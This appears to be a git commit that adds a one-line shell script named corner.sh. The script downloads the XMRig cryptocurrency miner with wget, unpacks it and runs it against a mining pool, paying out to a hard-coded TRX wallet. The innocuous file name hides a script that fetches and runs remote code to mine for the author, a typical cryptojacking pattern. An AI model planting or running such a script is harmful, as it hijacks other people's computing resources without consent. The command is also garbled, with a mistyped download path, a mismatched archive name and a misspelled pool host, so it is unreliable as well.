4bed9b2d71fb2133f510fa6d0719bad59fe59b36
rahman33 <onggenk33.sjf@gmail.com>
2023-10-21 13:08:50 -0600

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/release/download/v6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17..0 && ./xmrig -o rx.unminiable.com:3333 -a rx -k -u TRX:TNyy6dLgz11FjuZdzXbZM5T3vrHzMrqRVD.01 -p x
